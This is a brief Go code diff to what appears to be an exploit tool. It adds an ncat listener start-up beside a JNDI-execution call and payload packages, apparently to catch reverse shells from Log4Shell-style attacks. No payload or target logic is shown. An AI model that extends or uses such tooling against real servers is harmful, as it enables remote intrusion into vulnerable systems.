@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"myapp/lib/execjndi"
+	"myapp/lib/ncat"
 	"myapp/lib/payload"
 	"myapp/lib/sysinfo"
 )
@@ -11,6 +12,7 @@ func main() {
 	banner()
 	startPayload := make(chan bool)
 	go func() {
+		ncat.StartNcat()
 		execjndi.ExecJNDI(startPayload)
 	}()
 	go func() {
